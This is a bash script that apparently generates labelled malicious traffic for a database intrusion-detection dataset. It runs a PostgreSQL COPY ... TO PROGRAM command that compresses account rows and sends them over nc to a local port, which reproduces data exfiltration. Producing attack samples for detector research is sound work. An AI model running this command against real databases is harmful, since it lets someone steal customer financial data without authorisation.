#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_exfil_var_2.sh (legacy: casce_tpcb, -U postgres).
# Only connection, table and label changed; the exfil command itself is unchanged.
# See ../ood_4d/sample_sessions.sh for the adaptation rule.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: exfiltration (gzip + nc), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:exfil_gzip_nc_r${REPEAT}" \
  $PSQL -U teller -c "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'gzip > /tmp/exfil_gzip_nc.dat && nc -w 1 127.0.0.1 9090 < /tmp/exfil_gzip_nc.dat 2>/dev/null || true';"
